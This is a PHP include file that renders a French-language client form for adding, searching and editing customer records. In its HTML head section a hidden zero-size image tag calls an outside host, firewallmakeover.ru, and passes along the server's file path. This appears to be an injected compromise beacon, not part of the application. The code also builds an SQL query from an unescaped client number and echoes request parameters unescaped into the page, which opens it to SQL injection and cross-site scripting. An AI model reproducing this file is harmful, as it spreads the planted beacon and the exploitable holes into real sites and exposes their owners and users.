 <?php
/* Programme : ClientForm.inc
 * Description : Affichage de la page des clients. Celui-ci présente un
 *  		 formulaire pour saisir les informations permettant d'ajouter
 *  		 de rechercher ou de modifier un client.
*	Auteur : Denis Léveillé 	 			  Date : 2007-10-24
*/

// if( $Quartier != "" )
// 	 require_once($acces_hermes."getvilprov.inc");
 if( $Quartier != "" ) {
 	$TabVille = array();	   
	$TabProvince = array();
	get_ville_prov($Quartier,$TabVille, $TabProvince);
	if( !count($TabVille) )
		unset($TabVille);
	if( !count($TabProvince) )
		unset($TabProvince);
 }

$Option = get_enums("client", "TypCli");
$Option2 = get_enums("client", "Langue");
$TabPaie =  get_money( "ALL" );

echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' >
		<meta http-equiv='Content-Disposition' content='inline; filename=Liste de client' >
		<meta http-equiv='Content-Description' content='text/html; charset=iso-8859-1' >
		<meta name='author' content='$NomCieCréé' >
		<meta name='copyright' content='copyright © $CopyAn $NomCie' >
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<base target='MAIN'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
</head>
<script language='JavaScript1.2' src='./extra/javafich/disablekeys.js'></script>
<script language='javascript1.2' src='./extra/javafich/blokclick.js'></script>
<script language='JavaScript1.2'>addKeyEvent();</script>
<body onload='javascript:pageonload()'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table  bgcolor='#EFEFEF' width='$Large' height='100%' cellpadding='0' cellspacing='0' align='$Enligne' border='0' >";

	if( isset($EN_AJOUT) ) 
  		echo "<form name=ClientForm action='client_ajout.php?do=new' method='post'>";
  	elseif( isset($EN_CONSULTE) ) 
	  	echo "<form name=ClientForm action='client_traite.php?do=Modif' method='post'>";
  	elseif( isset($EN_RECHERCHE) ) 
	  	echo "<form name=ClientForm action='client_recherche.php?do=rech' method='post'>"; 
	else
	  	echo "<form name=ClientForm action='' method='post'>";
  	
  
?>
    <tr>
   	<td colspan="2" bgcolor="#000FFF" align="center">
      	<font color="white" size="+1">
         <b><?php echo $TabId[5] ?></b></font>
      </td>
   </tr>
   <tr>
      <td align='right'><b><?php echo $TabId[6] ?>&nbsp;</b></td>
      <td><input type="text" name="NoClient" size="10" value="<?php echo @$NoClient ?>"
<?php
	if( isset($EN_CLIENT) || isset($EN_CONSULTE)  )
		echo "class='inputvoid' onFocus='this.blur()'";
	echo " maxlength='10'>";
?>
      	  &nbsp;&nbsp;&nbsp;
          <b><?php echo $TabId[7] ?>&nbsp;</b>
          <input type="text" name="Identite" size="15" value="<?php echo @$Identite ?>" >
      	  &nbsp;&nbsp;&nbsp;
          <b><?php echo $TabId[8] ?>&nbsp;</b>
          <input type="text" name="Debit" size="15" value="<?php echo @$Debit ?>" >
          <b><?php echo $TabId[76] ?>&nbsp;</b>
          <input type="text" name="Naissance" size="10" value="<?php echo @$Naissance ?>" >
      </td>
   </tr>
   <tr>
      <td size="5" align=right><b><?php echo $TabId[9] ?>&nbsp;</b></td>
      <td><input type="text" name="Nom" size="30" value="<?php echo @$Nom ?>" maxlength="40" onchange='capitalize();' >
      	  &nbsp;&nbsp;&nbsp;
          <b><?php echo $TabId[10] ?>&nbsp;</b>
          <input type="text" name="Prenom" onchange='capitalize();' size="30" value="<?php echo @$Prenom ?>" maxlength="40">
      </td>
   </tr>
   <tr>
      <td size="5" align=right><b><?php echo $TabId[74] ?>&nbsp;</b></td>
      <td><input type="text" name="Contact" onchange='capitalize();' size="75" value="<?php echo @$Contact ?>" >
      </td>
   </tr>
   <tr>
      <td align=right><b><?php echo $TabId[11] ?>&nbsp;</b></td>
      <td><input type="text" name="Rue" size="23" value="<?php echo @$Rue ?>" maxlength="50" onchange='capitalize();' >
      	  &nbsp;&nbsp;&nbsp;
          <b><?php echo $TabId[12] ?>&nbsp;</b>
          <input type="text" name="Quartier" size="13" value="<?php echo @$Quartier ?>" maxlength="20" onchange=CheckVilProv()>
	<?php
	// Bouton recherche de quartier
           if( isset($EN_AJOUT) ) 
		   echo "<input class='boutChx' type='submit' name='Commande' value='$TabMessGen[104]'>"; 
    ?>
      	  &nbsp;&nbsp;&nbsp;
		  <b><?php echo $TabId[13] ?>&nbsp;</b>
	<?php
          if( isset($TabVille) ) {
            echo "<select name='Ville' size='1' maxlenght='20'  class='s2'>";
  		    for($i=0;$i<sizeof($TabVille);$i++) {
    		  echo "<option value='".$TabVille[$i]."' ";
    		  if( $Ville == $TabVille[$i] ) echo " SELECTED";
    		   echo " >".$TabVille[$i];
  			}  
	 		if( isset($selection) && !$selection && strlen($Ville) ) {
				echo "<option value='$Ville' SELECTED";
				echo " >$Ville</select>";
			}
			else {
				echo "<option value=''";
				if( !strlen($Ville) ) echo " SELECTED";
				echo " ></select>";
			}
		  }
		  else {
		    echo "<input type='text' name='Ville' size='20' value='$Ville' maxlength='40' onchange='capitalize();' >";
		  }	 
	?>
      </td>
   </tr>
   <tr>
      <td align=right><b><?php echo $TabId[14] ?>&nbsp;</b></td>
      <td>
	<?php
          if( isset($TabProvince) ) {
            echo "<select name='Province' size='1'  class='s2'>";
  		    for($i=0;$i<sizeof($TabProvince);$i++) {
    		  echo "<option value='".$TabProvince[$i]."' ";
    		  if( $Province == $TabProvince[$i] ) echo " SELECTED";
    		   echo " >".$TabProvince[$i];
  			}  
		if( isset($selection) && !$selection && strlen($Province) ) {
			echo "<option value='$Province' SELECTED";
			echo " >$Province</select>";
		}
		else {
			echo "<option value=''";
			if( !strlen($Province) ) echo " SELECTED";
			echo " ></select>";
		}
		  }
		  else {
		    echo "<input type='text' name='Province' size='20' value='$Province' onchange='capitalize();' >";
		  }
	?>		 
      	  &nbsp;&nbsp;&nbsp;
		  <b><?php echo $TabId[15] ?>&nbsp;</b>
         <input type="text" name="Pays" size="30" value="<?php echo @$Pays ?>"
<?php
	if( $TypCli != "DESTINATAIRE" ) 
		echo " >";
   else
		echo " class='inputvoid' onFocus='this.blur()'>";
?>
          &nbsp;&nbsp;&nbsp;
	  	  <b><?php echo $TabId[16] ?>&nbsp;</b>
	  	  <input type="text" name="CodePostal" size="10" value="<?php echo @$CodePostal ?>" onchange='capitalize();' >
      </td>
   </tr>
   <tr>
	  <td align=right><b><?php echo $TabId[17] ?>&nbsp;</b></td>
      <td><input type="text" name="Indication" size="40" value="<?php echo @$Indication ?>" >
          &nbsp;&nbsp;&nbsp;
	  	  <b><?php echo $TabId[75] ?>&nbsp;</b>
	  	  <input type="text" name="Profession" size="40" value="<?php echo @$Profession ?>" maxlength="100" onchange='capitalize();' >
      </td>
   </tr>
   <tr>
      <td align=right><b><?php echo $TabId[18] ?>&nbsp;</b></td>
      <td>(<input type="text" name="TelCodR" size="3" value="<?php echo @$TelCodR ?>" >)
 		  <input type="text" name="TelP1" size="3" value="<?php echo @$TelP1 ?>" >
				 -		
		  <input type="text" name="TelP2" size="4" value="<?php echo @$TelP2 ?>" >
		  &nbsp;&nbsp;&nbsp;
	  <b><?php echo $TabId[19] ?>&nbsp;</b>
          <input type="text" name="Fax" size="15" value="<?php echo @$Fax ?>" >
          &nbsp;&nbsp;&nbsp;
	  <b><?php echo $TabId[20] ?>&nbsp;</b>
          <input type="text" name="Cellulaire" size="15" value="<?php echo @$Cellulaire ?>" >
      </td>
   </tr>
   <tr>
      <td align=right><b><?php echo $TabId[21] ?>&nbsp;</b></td>
      <td><input type="text" name="Courriel" size="55" value="<?php echo @$Courriel ?>" maxlength="67">
      	  &nbsp;&nbsp;&nbsp;
          <b><?php echo $TabId[22] ?>&nbsp;</b>
        	<input type="text" name="TypCli" size="15" value="<?php echo @$TypCli ?>" class='inputview' maxlength='7' onFocus='this.blur()'/>
      </td>
   </tr>
   <tr>
      <td align=right><b><?php echo $TabId[23] ?>&nbsp;</b></td>
      <td><input class="inputvoid" type="text" name="DateInscrip" onFocus="this.blur()" size="9" value="<?php echo @$DateInscrip ?>">
      	  &nbsp;&nbsp;&nbsp;
          <b><?php echo $TabId[24] ?>&nbsp;</b>
          <input type="text" name="DateRappel" size="9" value="<?php echo @$DateRappel ?>">
          &nbsp;&nbsp;&nbsp;
          <b><?php echo $TabId[25] ?>&nbsp;</b>
          <input type="text" name="DernAchat" size="9" value="<?php echo @$DernAchat ?>"
<?php 
			if( isset($EN_AJOUT) ) 
				echo "class='inputvoid' onFocus='this.blur()'>"; 
			else 
				echo "maxlength='10' >"; 
?>
		</td>
   </tr>
   <tr>
       <td align=right><b><?php echo $TabId[26] ?>&nbsp;</b></td>
       <td>
          <select name="Langue" size="1" class='s2'>
<?php
       if( isset($EN_RECHERCHE) || isset($EN_AJOUT) ) 
           echo "<option value='' SELECTED >";
  for($i=0;$i<sizeof($Option2);$i++) {
    echo "<option value='".$Option2[$i]."' ";
    if( $Langue == $Option2[$i] ) echo " SELECTED";
    echo " >".$Option2[$i];
  }  ?>
          </select>
			<input type="hidden" name="Message" value="<?php echo @$Message ?>" />
			<input type="hidden" name="Refere" value="<?php echo @$Refere ?>"/>
			<input type="hidden" name="AncienNo" value="<?php echo @$AncienNo ?>"/>
       </td>
   </tr>
   <tr>
       <td align=right><b><?php echo $TabId[29] ?>&nbsp;</b></td>
       <td><input class="inputvoid" type="text" name="TotalEnvoi" onFocus="this.blur()" size="9" value="<?php echo @$TotalEnvoi ?>">
       	  &nbsp;&nbsp;
          <b><?php echo $TabId[30] ?>&nbsp;</b>
          <input class="inputvoid" type="text" name="AchatAnnuel" onFocus="this.blur()" size="9" value="<?php echo @$AchatAnnuel ?>">
          &nbsp;&nbsp;
          <b><?php echo $TabId[31] ?>&nbsp;</b>
          <input class="inputvoid" type="text" name="CoteCredit" onFocus="this.blur()" size="2" value="<?php echo @$CoteCredit ?>">
       </td>
   </tr>
   <tr>
       <td align=right><b><?php echo $TabId[32] ?>&nbsp;</b></td>
       <td>
         <select name="TPSApp" size="1" disabled  class='s2' >
         <option value="OUI" <?php if( $TPSApp == "OUI" ) echo 'SELECTED' ?>><?=$TabMessGen[200]?>
         <option value="NON" <?php if( $TPSApp == "NON" ) echo 'SELECTED' ?>><?=$TabMessGen[201]?>
         </select>
			&nbsp;&nbsp;
			<b><?php echo $TabId[33] ?>&nbsp;</b>
         <select name="TVQApp" size="1" disabled  class='s2'>
         <option value="OUI" <?php if( $TVQApp == "OUI" ) echo 'SELECTED' ?>><?=$TabMessGen[200]?>
         <option value="NON" <?php if( $TVQApp == "NON" ) echo 'SELECTED' ?>><?=$TabMessGen[201]?>
         </select>
			&nbsp;&nbsp;
			<b><?php echo $TabId[34] ?>&nbsp;</b>
			<input type="text" name="MaxCredit" size="7" value="<?php echo @$MaxCredit ?>" class='inputview' onFocus='this.blur()' />
			&nbsp;&nbsp;
			<b><?php echo $TabId[35] ?>&nbsp;</b>
			<input type='text' class='inputview' name='Solde' onFocus='this.blur()' size='10' value='<?php echo @$Solde ?>'/>
			&nbsp;<b><?php echo $TabId[72] ?>&nbsp;</b>
			<input class='inputview' type='text' name='DevCli' onFocus='this.blur()' size='4' value='<?php echo @$DevCli ?>' maxlength='7'/>
       </td>
   </tr>
   <tr>
       <td colspan="2" align="center">
          <?php
			if( isset($_REQUEST['retour']) ) {
//   	   	echo "<input type='submit' name='Commande' value='$TabId[41]' onClick='window.open(\"client_traite.php?do=Modif&retour=".$_GET['retour']."\",\"_self\"); return false;' class='form1'>&nbsp;"; // Modifier
   	   	echo "<input type='submit' name='Commande' value='$TabId[41]' class='form1'>&nbsp;"; // Modifier
				echo "<input type='button' name='Caisse' value='".$txt['retour_etape_finale']."' onClick='window.open(\"".$_REQUEST['retour'].".php\",\"_self\"); return false;' class='form1'>";
				echo "<input type='hidden' name='retour' value='".$_REQUEST['retour']."'>";
			}	
			else {
         	if( isset($EN_CLIENT) ) {
				//	echo "<input type='button' name='Commande' value='$TabId[37]' onClick='ConsulteCptCli()'>&nbsp;";
				//	echo "<input type='button' name='Commande' value='$TabId[38]' onClick='ConsulteTransaction()'>&nbsp;";
		      	if( ($TypCli == "DESTINATAIRE") &&  ( @$_SESSION['Prio'] <= $PrioLivreur ) ) {
   	   		 	  echo "<input type='submit' name='Commande' value='$TabId[41]'>&nbsp;"; // Modifier
			  		}	 // Si dossier destinataire et chef livreur  
					if( isset($_GET['retour']) ) 
						echo "<input type='button' name='Caisse' value='".$txt['retour_etape_finale']."' onClick='window.open(\"".$_GET['retour'].".php\",\"_self\"); return false;' class='form1'>";
            } // Si en mode client
           	if( isset($EN_AJOUT) ) 
				  	echo "<input type='submit' name='Commande' value='$TabId[39]'>&nbsp;"; // Ajouter
				elseif( isset($EN_RECHERCHE) ) {
					echo "<input type='submit' name='Commande' value='$TabId[40]'>&nbsp;\n"; // Rechercher
					echo "<input type='button' name='Commande' value='$TabId[79]' onClick='ResetClient()'>&nbsp;\n"; // Reset
				} // EN RECHERCHE
           if( isset($EN_CONSULTE) ) {
					echo "<input type='submit' name='Commande' value='$TabId[41]'>&nbsp;"; // Modifier
					echo "<input type='button' name='Commande' value='$TabId[80]' onClick='ChangePass()'>&nbsp;"; // Change Password
					echo "<input type='button' name='Commande' value='$TabId[46]' onClick='ImprimePage()'>&nbsp;";
			 		echo "<input type='button' name='Commande' value='$TabId[38]' onClick='ConsulteFacture()'>&nbsp;";
		 			echo "<input type='button' name='Commande' value='$TabId[47]' onClick='ConsulteTransaction()'>&nbsp;";
 			 		echo "<input type='button' name='Commande' value='$TabId[81]' onClick='AjoutDestinataire()'>&nbsp;"; // Destination
        	  		echo "<input type='button' name='Commande' value='$TabId[36]' onClick='FermeClient()'>&nbsp;";
          } // En CONSULTE
         }
         ?>
       </td>
   </tr>
   <tr>
       <td colspan="2" bgcolor="#000FFF" align="center">
          <font color="white" size="+1">
          <?php 
		    if( isset($EN_AJOUT) ) echo "<b>$TabId[49]</b>"; 
            if( isset($EN_RECHERCHE) ) echo "<b>$TabId[50]</b>"; 
 //           if( isset($EN_CONSULTE) ) echo "<b>$TabId[51]</b>"; 
            if( isset($EN_CLIENT) ) echo "<b>$TabId[52]</b>";
		  ?> 
          </font>
       </td>
   </tr>
</table>
</form>

<script language='javascript'>

function ResetClient() {
      document.ClientForm.Nom.value = "";
      document.ClientForm.Prenom.value = "";
      document.ClientForm.Contact.value = "";
      document.ClientForm.Rue.value = "";
	  document.ClientForm.Quartier.value = "";
      document.ClientForm.Ville.value = "";
      document.ClientForm.Province.value = "";
      document.ClientForm.Pays.value = "";
      document.ClientForm.CodePostal.value = "";
      document.ClientForm.Identite.value = "";
      document.ClientForm.Indication.value = "";
      document.ClientForm.CodePostal.value = "";
      document.ClientForm.TelCodR.value = "";
      document.ClientForm.TelP1.value = "";
      document.ClientForm.TelP2.value = "";
      document.ClientForm.Fax.value = "";
      document.ClientForm.Cellulaire.value = "";
	  document.ClientForm.NoClient.focus();
} // ResetClient


//Convert the username to uppercase.
function capitalize() {
		document.ClientForm.Nom.value = document.ClientForm.Nom.value.toUpperCase();
		document.ClientForm.Prenom.value = document.ClientForm.Prenom.value.toUpperCase();
		document.ClientForm.Contact.value = document.ClientForm.Contact.value.toUpperCase();
		document.ClientForm.Rue.value = document.ClientForm.Rue.value.toUpperCase();
		document.ClientForm.Quartier.value = document.ClientForm.Quartier.value.toUpperCase()
		document.ClientForm.CodePostal.value = document.ClientForm.CodePostal.value.toUpperCase();
		document.ClientForm.Ville.value = document.ClientForm.Ville.value.toUpperCase();
		document.ClientForm.Province.value = document.ClientForm.Province.value.toUpperCase();
		document.ClientForm.Pays.value = document.ClientForm.Pays.value.toUpperCase();
		document.ClientForm.Profession.value = document.ClientForm.Profession .value.toUpperCase();
} // capitalize

function CheckVilProv() {
    document.ClientForm.Quartier.value = document.ClientForm.Quartier.value.toUpperCase();
}


function ConsulteLesTarifs() {
	open('<?=$acces_hermes?>/hermes/tariflst.php?NoCli=<?php echo @$NoClient ?>','_blank','left=10,top=10,height=250,width=400,status=no,toolbar=no,scrollbars=yes,menubar=no,location=no,resizable=no' );
} // Consultes les tarifs


function ConsulteTransaction() {
	// <?=$acces_hermes?>/hermes/
	open('trslstcli.php?NoCliE=<?php echo @$NoClient ?>','_blank', 
	'left=10,top=10,height=475,width=750,status=yes,toolbar=no,scrollbars=yes,menubar=no,location=no,resizable=no' );
} // ConsulteTransaction

function ConsulteFacture() {
	open('vente_list.php?NoCli=<?php echo @$NoClient ?>','_blank', 
	'left=10,top=10,height=475,width=740,status=no,toolbar=no,scrollbars=yes,menubar=no,location=no,resizable=yes' );
} // ConsulteFacture

function AjoutDestinataire() {
	<?php
		$sql = "SELECT * FROM $database.destinataire WHERE Envoyeur = '$NoClient'";
		$result = mysql_query( $sql );
		if( $result && mysql_num_rows($result) )  
			echo "open('client_dest.php?NoCliE=$NoClient','_blank', 'left=10,top=10,height=480,width=720,status=no,toolbar=no,scrollbars=no,menubar=no,location=no,resizable=no');";
		else {
			if( !isset($_SESSION['Service']) )
				$_SESSION['Service'] = 0;
			if( !isset($_SESSION['Totaux']['totalpourbanque']) )
				$_SESSION['Totaux']['totalpourbanque'] = 0.01;
			echo "open('client_ajout.php?do=Dest&NoCliE=$NoClient','_self');";
		}
			//client_ajout.php?do=Dest&NoCliE=$NoClient', chk_adresse_livraison.php?retour=client_traite
	?>
} // AjoutDestinataire

function FermeClient() {
	open("connexion.php?action=deconnexion","_self" );
} // FermeClient

function ChangePass() {
	open("password_modif.php","_self" );
} // ChangePass(

function ImprimePage() {
	window.print();
} // ImprimePage

function pageonload() {
   document.ClientForm.NoClient.focus();
	<?php
		if( isset($EN_AJOUT) ) 
			echo "window.status = '$TabId[70]';\r\n";
		if( isset($EN_RECHERCHE) ) 
			echo "window.status = '$TabId[71]';\r\n";
		if( isset($NewMessage) ) {
			echo "window.alert(\"$NewMessage\");\r\n";
			unset( $NewMessage );
		};
		if( isset($MessQuartier) ) {
			echo " 
				if( window.confirm('$MessQuartier') ){
					open('$acces_hermes/hermes/quartajcli.php?Quartier=$Quartier&Ville=$Ville&Province=$Province&Pays=$Pays','_blank',
							'left=10,top=10,height=400,width=400,status=no,toolbar=no,scrollbars=no,menubar=no,location=no,resizable=no' );			   		 	 
				}";
		}
  ?>
	 return;
} // pageonload

function Rafraichie(){
//			window.location.reload();
	document.ClientForm.submit();
}

</script>
</body>
</html>